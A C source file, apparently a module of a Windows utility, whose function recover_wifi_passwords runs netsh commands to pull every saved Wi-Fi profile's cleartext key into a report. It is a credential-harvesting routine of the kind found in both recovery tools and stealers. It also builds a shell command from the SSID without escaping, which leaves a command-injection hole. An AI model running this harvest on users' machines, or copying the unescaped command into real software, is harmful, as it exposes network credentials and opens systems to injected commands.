#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "wifi.h"

// Helper to execute command and get output
static char* exec_command(const char* cmd) {
    char buffer[1024];
    char* result = NULL;
    size_t result_size = 0;
    FILE* pipe = _popen(cmd, "r");

    if (!pipe) return NULL;

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t len = strlen(buffer);
        char* new_result = realloc(result, result_size + len + 1);
        if (!new_result) {
            free(result);
            _pclose(pipe);
            return NULL;
        }
        result = new_result;
        strcpy(result + result_size, buffer);
        result_size += len;
    }
    _pclose(pipe);
    return result;
}

char* recover_wifi_passwords() {
    char* profiles_output = exec_command("netsh wlan show profiles");
    if (!profiles_output) return NULL;

    // Estimate size for final report
    size_t report_size = 4096;
    char* report = malloc(report_size);
    if (!report) {
         free(profiles_output);
         return NULL;
    }
    strcpy(report, "=== WiFi Passwords ===\n\n");

    char* line = strtok(profiles_output, "\n");
    while (line) {
        if (strstr(line, "All User Profile")) {
            char* profile_name = strchr(line, ':');
            if (profile_name) {
                profile_name += 2; // Skip ": "
                // Trim trailing newline/cr
                profile_name[strcspn(profile_name, "\r\n")] = 0;

                char cmd[512];
                snprintf(cmd, sizeof(cmd), "netsh wlan show profile name=\"%s\" key=clear", profile_name);

                char* key_output = exec_command(cmd);
                if (key_output) {
                    char* key_content = strstr(key_output, "Key Content");
                    if (key_content) {
                        char* password = strchr(key_content, ':');
                        if (password) {
                            password += 2;
                            password[strcspn(password, "\r\n")] = 0;

                            char entry[512];
                            snprintf(entry, sizeof(entry), "SSID: %s\nPassword: %s\n------------------\n", profile_name, password);

                            // Realloc if needed (simple check)
                            if (strlen(report) + strlen(entry) + 1 > report_size) {
                                report_size *= 2;
                                char* new_report = realloc(report, report_size);
                                if (!new_report) {
                                    free(report); free(key_output); free(profiles_output); return NULL;
                                }
                                report = new_report;
                            }
                            strcat(report, entry);
                        }
                    } else {
                         char entry[512];
                         snprintf(entry, sizeof(entry), "SSID: %s\nPassword: <Open/Not Found>\n------------------\n", profile_name);
                          if (strlen(report) + strlen(entry) + 1 > report_size) {
                                report_size *= 2;
                                char* new_report = realloc(report, report_size);
                                if (!new_report) {
                                    free(report); free(key_output); free(profiles_output); return NULL;
                                }
                                report = new_report;
                            }
                         strcat(report, entry);
                    }
                    free(key_output);
                }
            }
        }
        line = strtok(NULL, "\n");
    }

    free(profiles_output);
    return report;
}
